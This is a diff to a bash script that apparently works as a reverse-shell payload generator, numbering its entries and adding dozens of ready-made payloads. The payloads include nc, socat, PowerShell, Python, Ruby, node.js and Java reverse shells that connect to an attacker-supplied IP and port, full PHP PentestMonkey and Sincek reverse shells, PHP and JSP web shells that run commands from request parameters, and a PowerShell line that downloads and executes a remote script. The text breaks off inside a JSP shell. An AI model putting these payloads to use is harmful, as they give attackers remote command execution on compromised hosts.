@@ -3,7 +3,6 @@
 #
 #
 #
-SHELLTYPE="sh"
 ENCODINGMETHOD=0
 #
 C=$(printf '\033')
@@ -113,8 +112,8 @@ revPayloadShell() {
 		"dash"
 	)
 
-	[[  $REVSHELLTYPE && $REVSHELLTYPE -gt 0 && $REVSHELLTYPE -lt "${#possibleShells[@]}" ]] && SHELLTYPE="${possibleShells[REVSHELLTYPE-1]}" || SHELLTYPE="sh"
-	
+	# [[  $REVSHELLTYPE && $REVSHELLTYPE -gt 0 && $REVSHELLTYPE -lt "${#possibleShells[@]}" ]] && SHELLTYPE="${possibleShells[REVSHELLTYPE-1]}" || SHELLTYPE="sh"
+
 	revShellPayloadEncoding
 }
 
@@ -320,33 +319,35 @@ hoaxShellPayloadTools() {
 # Reverse Shell Payloads
 #
 revShellPayloads=(
-	# Bash -i
+	# 1. Bash -i
 	"${SHELLTYPE} -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1" \
-	# Bash 196
+	# 2. Bash 196
 	"0<&196;exec 196<>/dev/tcp/${IPADDR}/${PORT}; ${SHELLTYPE} <&196 >&196 2>&196"
-	# Bash readline
+	# 3. Bash readline
 	"exec 5<>/dev/tcp/${IPADDR}/${PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done" 
-	# Bash 5
+	# 4. Bash 5
 	"${SHELLTYPE} -i 5<> /dev/tcp/${IPADDR}/${PORT} 0<&5 1>&5 2>&5"
-	# Bash udp
+	# 5. Bash udp
 	"${SHELLTYPE} -i >& /dev/udp/${IPADDR}/${PORT} 0>&1"
-	# nc mkfifo
+	# 6. nc mkfifo
 	"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELLTYPE} -i 2>&1|nc ${IPADDR} ${PORT} >/tmp/f"
-	# nc -e
+	# 7. nc -e
 	"nc ${IPADDR} ${PORT} -e ${SHELLTYPE}"
-	# BusyBox nc -e
+	# 8. nc.exe -e
+	"nc.exe ${IPADDR} ${PORT} -e ${SHELLTYPE}"
+	# 9. BusyBox nc -e
 	"busybox nc ${IPADDR} ${PORT} -e ${SHELLTYPE}"
-	# nc -c
+	# 10. nc -c
 	"nc -c ${SHELLTYPE} ${IPADDR} ${PORT}"
-	# ncat -e
+	# 11. ncat -e
 	"ncat ${IPADDR} ${PORT} -e ${SHELLTYPE}"
-	# ncat.exe -e
+	# 12. ncat.exe -e
 	"ncat.exe ${IPADDR} ${PORT} -e ${SHELLTYPE}"
-	# ncat udp
+	# 13. ncat udp
 	"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELLTYPE} -i 2>&1|ncat -u ${IPADDR} ${PORT} >/tmp/f"
-	# rustcat
+	# 14. rustcat
 	"rcat ${IPADDR} ${PORT} -r ${SHELLTYPE}"
-	# C
+	# 15. C
 	"#include <stdio.h>
 	#include <sys/socket.h>
 	#include <sys/types.h>
@@ -375,7 +376,7 @@ revShellPayloads=(
 
 	    return 0;       
 	}"
-	# C Windows
+	# 16. C Windows
 	"#include <winsock2.h>
 	#include <stdio.h>
 	#pragma comment(lib,\"ws2_32\")
@@ -417,7 +418,7 @@ revShellPayloads=(
 
 	    return 0;
 	}"
-	# C# TCP Client
+	# 17. C# TCP Client
 	"using System;
 	using System.Text;
 	using System.IO;
@@ -487,7 +488,7 @@ revShellPayloads=(
 
 		}
 	}"
-	# C# Bash -i
+	# 18. C# Bash -i
 	"using System;
 	using System.Diagnostics;
 	
@@ -507,17 +508,17 @@ revShellPayloads=(
 		}
 	  }
 	}"
-	# Haskel #1
+	# 19. Haskel #1
 	"module Main where
 
 	import System.Process
 
 	main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | ${SHELLTYPE} -i 2>&1 | nc ${IPADDR} ${PORT} >/tmp/f\""
-	# Perl
+	# 20. Perl
 	"perl -e 'use Socket;\$i=\"${IPADDR}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"${REVSHELLTYPE} -i\");};'"
-	# Perl no sh
+	# 21. Perl no sh
 	"perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${IPADDR}:${PORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
-	# Perl PentestMonkey
+	# 22. Perl PentestMonkey
 	"#!/usr/bin/perl -w
 	# perl-reverse-shell - A Reverse Shell implementation in PERL
 	# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
@@ -643,8 +644,714 @@ revShellPayloads=(
 	Content-Type: text\/html\\r\\n\\r\\n\" . \$global_page;
 	}
 	"
-)
+	# 23. PHP PentestMonkey
+	"<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 
+set_time_limit (0);
+\$VERSION = \"1.0\";
+\$ip = '${IPADDR}';
+\$port = ${PORT};
+\$chunk_size = 1400;
+\$write_a = null;
+\$error_a = null;
+\$shell = 'uname -a; w; id; tcsh -i';
+\$daemon = 0;
+\$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+	\$pid = pcntl_fork();
+	
+	if (\$pid == -1) {
+		printit(\"ERROR: Can't fork\");
+		exit(1);
+	}
+	
+	if (\$pid) {
+		exit(0);  // Parent exits
+	}
+	if (posix_setsid() == -1) {
+		printit(\"Error: Can't setsid()\");
+		exit(1);
+	}
+
+	\$daemon = 1;
+} else {
+	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");
+}
+
+chdir(\"/\");
+
+umask(0);
+
+// Open reverse connection
+\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
+if (!\$sock) {
+	printit(\"\$errstr (\$errno)\");
+	exit(1);
+}
+
+\$descriptorspec = array(
+   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from
+   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to
+   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to
+);
+
+\$process = proc_open(\$shell, \$descriptorspec, \$pipes);
+
+if (!is_resource(\$process)) {
+	printit(\"ERROR: Can't spawn shell\");
+	exit(1);
+}
+
+stream_set_blocking(\$pipes[0], 0);
+stream_set_blocking(\$pipes[1], 0);
+stream_set_blocking(\$pipes[2], 0);
+stream_set_blocking(\$sock, 0);
+
+printit(\"Successfully opened reverse shell to \$ip:\$port\");
+
+while (1) {
+	if (feof(\$sock)) {
+		printit(\"ERROR: Shell connection terminated\");
+		break;
+	}
+
+	if (feof(\$pipes[1])) {
+		printit(\"ERROR: Shell process terminated\");
+		break;
+	}
+
+	\$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
+	\$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);
+
+	if (in_array(\$sock, \$read_a)) {
+		if (\$debug) printit(\"SOCK READ\");
+		\$input = fread(\$sock, \$chunk_size);
+		if (\$debug) printit(\"SOCK: \$input\");
+		fwrite(\$pipes[0], \$input);
+	}
+
+	if (in_array(\$pipes[1], \$read_a)) {
+		if (\$debug) printit(\"STDOUT READ\");
+		\$input = fread(\$pipes[1], \$chunk_size);
+		if (\$debug) printit(\"STDOUT: \$input\");
+		fwrite(\$sock, \$input);
+	}
+
+	if (in_array(\$pipes[2], \$read_a)) {
+		if (\$debug) printit(\"STDERR READ\");
+		\$input = fread(\$pipes[2], \$chunk_size);
+		if (\$debug) printit(\"STDERR: \$input\");
+		fwrite(\$sock, \$input);
+	}
+}
+
+fclose(\$sock);
+fclose(\$pipes[0]);
+fclose(\$pipes[1]);
+fclose(\$pipes[2]);
+proc_close(\$process);
+
+function printit (\$string) {
+	if (!\$daemon) {
+		print \"\$string\\n\";
+	}
+}
+
+?>"
+	# 24. PHP Ivan Sincek
+	"<?php
+// Copyright (c) 2020 Ivan Sincek
+// v2.3
+// Requires PHP v5.0.0 or greater.
+// Works on Linux OS, macOS, and Windows OS.
+// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
+class Shell {
+    private \$addr  = null;
+    private \$port  = null;
+    private \$os    = null;
+    private \$shell = null;
+    private \$descriptorspec = array(
+        0 => array('pipe', 'r'), // shell can read from STDIN
+        1 => array('pipe', 'w'), // shell can write to STDOUT
+        2 => array('pipe', 'w')  // shell can write to STDERR
+    );
+    private \$buffer  = 1024;    // read/write buffer size
+    private \$clen    = 0;       // command length
+    private \$error   = false;   // stream read/write error
+    public function __construct(\$addr, \$port) {
+        \$this->addr = \$addr;
+        \$this->port = \$port;
+    }
+    private function detect() {
+        \$detected = true;
+        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
+            \$this->os    = 'LINUX';
+            \$this->shell = 'tcsh';
+        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
+            \$this->os    = 'WINDOWS';
+            \$this->shell = 'cmd.exe';
+        } else {
+            \$detected = false;
+            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";
+        }
+        return \$detected;
+    }
+    private function daemonize() {
+        \$exit = false;
+        if (!function_exists('pcntl_fork')) {
+            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";
+        } else if (($pid = @pcntl_fork()) < 0) {
+            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";
+        } else if (\$pid > 0) {
+            \$exit = true;
+            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";
+        } else if (posix_setsid() < 0) {
+            // once daemonized you will actually no longer see the script's dump
+            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";
+        } else {
+            echo \"DAEMONIZE: Completed successfully!\\n\";
+        }
+        return \$exit;
+    }
+    private function settings() {
+        @error_reporting(0);
+        @set_time_limit(0); // do not impose the script execution time limit
+        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
+    }
+    private function dump(\$data) {
+        \$data = str_replace('<', '&lt;', \$data);
+        \$data = str_replace('>', '&gt;', \$data);
+        echo \$data;
+    }
+    private function read(\$stream, \$name, \$buffer) {
+        if ((\$data = @fread(\$stream, \$buffer)) === false) { // suppress an error when reading from a closed blocking stream
+            \$this->error = true;                            // set global error flag
+            echo \"STRM_ERROR: Cannot read from \${name}, script will now exit...\\n\";
+        }
+        return \$data;
+    }
+    private function write(\$stream, \$name, \$data) {
+        if ((\$bytes = @fwrite(\$stream, \$data)) === false) { // suppress an error when writing to a closed blocking stream
+            \$this->error = true;                            // set global error flag
+            echo \"STRM_ERROR: Cannot write to \${name}, script will now exit...\\n\";
+        }
+        return \$bytes;
+    }
+    // read/write method for non-blocking streams
+    private function rw(\$input, \$output, \$iname, \$oname) {
+        while ((\$data = \$this->read(\$input, \$iname, \$this->buffer)) && \$this->write(\$output, \$oname, \$data)) {
+            if (\$this->os === 'WINDOWS' && \$oname === 'STDIN') { \$this->clen += strlen(\$data); } // calculate the command length
+            \$this->dump(\$data); // script's dump
+        }
+    }
+    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
+    // we must read the exact byte length from a stream and not a single byte more
+    private function brw(\$input, \$output, \$iname, \$oname) {
+        \$fstat = fstat(\$input);
+        \$size = \$fstat['size'];
+        if (\$this->os === 'WINDOWS' && \$iname === 'STDOUT' && \$this->clen) {
+            // for some reason Windows OS pipes STDIN into STDOUT
+            // we do not like that
+            // we need to discard the data from the stream
+            while (\$this->clen > 0 && (\$bytes = \$this->clen >= \$this->buffer ? \$this->buffer : \$this->clen) && \$this->read(\$input, \$iname, \$bytes)) {
+                \$this->clen -= \$bytes;
+                \$size -= \$bytes;
+            }
+        }
+        while (\$size > 0 && (\$bytes = \$size >= \$this->buffer ? \$this->buffer : \$size) && (\$data = \$this->read(\$input, \$iname, \$bytes)) && \$this->write(\$output, \$oname, \$data)) {
+            \$size -= \$bytes;
+            \$this->dump(\$data); // script's dump
+        }
+    }
+    public function run() {
+        if (\$this->detect() && !\$this->daemonize()) {
+            \$this->settings();
+
+            // ----- SOCKET BEGIN -----
+            \$socket = @fsockopen(\$this->addr, \$this->port, \$errno, \$errstr, 30);
+            if (!\$socket) {
+                echo \"SOC_ERROR: {\$errno}: {\$errstr}\\n\";
+            } else {
+                stream_set_blocking(\$socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS
+
+                // ----- SHELL BEGIN -----
+                \$process = @proc_open(\$this->shell, \$this->descriptorspec, \$pipes, null, null);
+                if (!\$process) {
+                    echo \"PROC_ERROR: Cannot start the shell\\n\";
+                } else {
+                    foreach (\$pipes as \$pipe) {
+                        stream_set_blocking(\$pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
+                    }
+
+                    // ----- WORK BEGIN -----
+                    \$status = proc_get_status(\$process);
+                    @fwrite(\$socket, \"SOCKET: Shell has connected! PID: \" . \$status['pid'] . \"\\n\");
+                    do {
+						\$status = proc_get_status(\$process);
+                        if (feof(\$socket)) { // check for end-of-file on SOCKET
+                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;
+                        } else if (feof(\$pipes[1]) || !\$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
+                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams
+                        }                                                                    // use proc_get_status() instead
+                        \$streams = array(
+                            'read'   => array(\$socket, \$pipes[1], \$pipes[2]), // SOCKET | STDOUT | STDERR
+                            'write'  => null,
+                            'except' => null
+                        );
+                        \$num_changed_streams = @stream_select(\$streams['read'], \$streams['write'], \$streams['except'], 0); // wait for stream changes | will not wait on Windows OS
+                        if (\$num_changed_streams === false) {
+                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;
+                        } else if (\$num_changed_streams > 0) {
+                            if (\$this->os === 'LINUX') {
+                                if (in_array(\$socket  , \$streams['read'])) { \$this->rw(\$socket  , \$pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
+                                if (in_array(\$pipes[2], \$streams['read'])) { \$this->rw(\$pipes[2], \$socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
+                                if (in_array(\$pipes[1], \$streams['read'])) { \$this->rw(\$pipes[1], \$socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
+                            } else if (\$this->os === 'WINDOWS') {
+                                // order is important
+                                if (in_array(\$socket, \$streams['read'])/*------*/) { \$this->rw (\$socket  , \$pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
+                                if ((\$fstat = fstat(\$pipes[2])) && \$fstat['size']) { \$this->brw(\$pipes[2], \$socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
+                                if ((\$fstat = fstat(\$pipes[1])) && \$fstat['size']) { \$this->brw(\$pipes[1], \$socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
+                            }
+                        }
+                    } while (!\$this->error);
+                    // ------ WORK END ------
+
+                    foreach (\$pipes as \$pipe) {
+                        fclose(\$pipe);
+                    }
+                    proc_close(\$process);
+                }
+                // ------ SHELL END ------
+
+                fclose(\$socket);
+            }
+            // ------ SOCKET END ------
+
+        }
+    }
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+\$sh = new Shell('${IPADDR}', ${PORT});
+\$sh->run();
+unset(\$sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>"
+	# 25. PHP cmd
+	"<html>
+<body>
+<form method=\"GET\" name=\"<?php echo basename(\$_SERVER['PHP_SELF']); ?>\">
+<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">
+<input type=\"SUBMIT\" value=\"Execute\">
+</form>
+<pre>
+<?php
+    if(isset(\$_GET['cmd']))
+    {
+        system(\$_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById(\"cmd\").focus();</script>
+</html>"
+	# 26. PHP cmd 2
+	"<?php if(isset(\$_REQUEST['cmd'])){ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }?>"
+	# 27. PHP cmd small
+	"<?=\`\$_GET[0]\`?>"
+	# 28. PHP exec
+	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});exec(\"${SHELLTYPE} <&3 >&3 2>&3\");'"
+	# 29. PHP shell_exec
+	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});shell_exec(\"${SHELLTYPE}<&3 >&3 2>&3\");'"
+	# 30. PHP system
+	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});system(\"${SHELLTYPE} <&3 >&3 2>&3\");'"
+	# 31. PHP passthru
+	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});passthru(\"${SHELLTYPE} <&3 >&3 2>&3\");'"
+	# 32. PHP `
+	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});\`${SHELLTYPE} <&3 >&3 2>&3\`;'"
+	# 33. PHP popen
+	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});popen(\"${SHELLTYPE} <&3 >&3 2>&3\", \"r\");'"
+	# 34. PHP proc_open
+	"php -r '\$sock=fsockopen(\"${IPADDR}\", ${PORT});\$proc=proc_open(\"${SHELLTYPE}\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
+	# 35. Windows ConPty
+	"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${IPADDR} ${PORT}"
+	# 36. PowerShell #1
+	"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${IPADDR}\", ${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+	# 37. PowerShell #2
+	"powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('${IPADDR}', ${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
+	# 38. PowerShell #3
+	"powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('${IPADDR}', ${PORT});\$NetworkStream = \$TCPClient.GetStream();\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()}WriteToStream '';while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()\""
+	# 39. PowerShell #4 (TLS)
+	"powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('${IPADDR}', ${PORT});\$NetworkStream = \$TCPClient.GetStream();\$SslStream = New-Object Net.Security.SslStream(\$NetworkStream,\$false,({\$true} -as [Net.Security.RemoteCertificateValidationCallback]));\$SslStream.AuthenticateAsClient('cloudflare-dns.com',\$null,\$false);if(!\$SslStream.IsEncrypted -or !\$SslStream.IsSigned) {\$SslStream.Close();exit}\$StreamWriter = New-Object IO.StreamWriter(\$SslStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()};WriteToStream '';while((\$BytesRead = \$SslStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()\""
+	# 40. PowerShell #4 (base64) [WORK ON THIS]
+	""
+	# 41. Python #1
+	"export RHOST=\"${IPADDR}\";export RPORT=${PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"${SHELLTYPE}\")'"
+	# 42. Python #2
+	"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IPADDR}\", ${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"${SHELLTYPE}\")'"
+	# 43. Python3 #1
+	"export RHOST=\"${IPADDR}\";export RPORT=${PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"${SHELLTYPE}\")'"
+	# 44. Python3 #2
+	"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IPADDR}\", ${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"${SHELLTYPE}\")'"
+	# 45. Python3 Windows
+	"import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((\"${IPADDR}\",${PORT}))
+
+p=subprocess.Popen([\"${SHELLTYPE}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()"
+	# 46. Python shortest
+	"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${IPADDR}\", ${PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"${SHELLTYPE}\")'"
+	# 47. Ruby #1
+	"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"${IPADDR}\", ${PORT}))'"
+	# 48. Ruby no sh
+	"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"${IPADDR}\",${PORT});loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'"
+	# 49. socat #1 
+	"socat TCP:${IPADDR}:${PORT} EXEC:${SHELLTYPE}"
+	# 50. socat #2 (TTY)
+	"socat TCP:${IPADDR}:${PORT} EXEC:'${SHELLTYPE}',pty,stderr,setsid,sigint,sane"
+	# 51. node.js
+	"require('child_process').exec('nc -e ${SHELLTYPE} ${IPADDR} ${PORT}')"
+	# 52. node.js #2
+	"(function(){
+    var net = require(\"net\"),
+        cp = require(\"child_process\"),
+        sh = cp.spawn(\"${SHELLTYPE}\", []);
+    var client = new net.Socket();
+    client.connect(${PORT}, \"${IPADDR}\", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();"
+	# 53. Java #1
+	"public class shell {
+    public static void main(String[] args) {
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec(\"bash -c \$@|bash 0 echo bash -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1\");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}"
+	# 54. Java #2
+	"public class shell {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"\$@| bash -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1\")
+            .redirectErrorStream(true);
+        try {
+            Process p = pb.start();
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}"
+	# 55. Java #3
+	"import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class shell {
+    public static void main(String[] args) {
+        String host = \"${IPADDR}\";
+        int port = ${PORT};
+        String cmd = \"${SHELLTYPE}\";
+        try {
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(host, port);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while (!s.isClosed()) {
+                while (pi.available() > 0)
+                    so.write(pi.read());
+                while (pe.available() > 0)
+                    so.write(pe.read());
+                while (si.available() > 0)
+                    po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try {
+                    p.exitValue();
+                    break;
+                } catch (Exception e) {}
+            }
+            p.destroy();
+            s.close();
+        } catch (Exception e) {}
+    }
+}"
+	# 56. Java Web
+	"<%@
+page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"
+% >
+<%!
+static class StreamConnector extends Thread
+{
+        InputStream is;
+        OutputStream os;
+        StreamConnector(InputStream is, OutputStream os)
+        {
+                this.is = is;
+                this.os = os;
+        }
+        public void run()
+        {
+                BufferedReader isr = null;
+                BufferedWriter osw = null;
+                try
+                {
+                        isr = new BufferedReader(new InputStreamReader(is));
+                        osw = new BufferedWriter(new OutputStreamWriter(os));
+                        char buffer[] = new char[8192];
+                        int lenRead;
+                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
+                        {
+                                osw.write(buffer, 0, lenRead);
+                                osw.flush();
+                        }
+                }
+                catch (Exception ioe)
+                try
+                {
+                        if(isr != null) isr.close();
+                        if(osw != null) osw.close();
+                }
+                catch (Exception ioe)
+        }
+}
+%>
+
+<h1>JSP Backdoor Reverse Shell</h1>
+
+<form method=\"post\">
+IP Address
+<input type=\"text\" name=\"ipaddress\" size=30>
+Port
+<input type=\"text\" name=\"port\" size=10>
+<input type=\"submit\" name=\"Connect\" value=\"Connect\">
+</form>
+<p>
+<hr>
+
+<%
+String ipAddress = request.getParameter(\"ipaddress\");
+String ipPort = request.getParameter(\"port\");
+if(ipAddress != null && ipPort != null)
+{
+        Socket sock = null;
+        try
+        {
+                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
+                Runtime rt = Runtime.getRuntime();
+                Process proc = rt.exec(\"cmd.exe\");
+                StreamConnector outputConnector =
+                        new StreamConnector(proc.getInputStream(),
+                                          sock.getOutputStream());
+                StreamConnector inputConnector =
+                        new StreamConnector(sock.getInputStream(),
+                                          proc.getOutputStream());
+                outputConnector.start();
+                inputConnector.start();
+        }
+        catch(Exception e) 
+}
+%>"
+	# 57. Java Two Way
+	"<%
+    /*
+     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
+     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
+     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
+     * the command specified in the HTML form). This is to avoid to keep it simple.
+     */
+%>
+
+<%@page import=\"java.lang.*\"%>
+<%@page import=\"java.io.*\"%>
+<%@page import=\"java.net.*\"%>
+<%@page import=\"java.util.*\"%>
+
+<html>
+<head>
+    <title>jrshell</title>
+</head>
+<body>
+<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">
+    <input TYPE=\"text\" NAME=\"shell\">
+    <input TYPE=\"submit\" VALUE=\"Send\">
+</form>
+<pre>
+<%
+    // Define the OS
+    String shellPath = null;
+    try
+    {
+        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {
+            shellPath = new String(\"/bin/sh\");
+        } else {
+            shellPath = new String(\"cmd.exe\");
+        }
+    } catch( Exception e ){}
+    // INNER HTML PART
+    if (request.getParameter(\"shell\") != null) {
+        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");
+        Process p;
+        if (shellPath.equals(\"cmd.exe\"))
+            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));
+        else
+            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+            out.println(disr);
+            disr = dis.readLine();
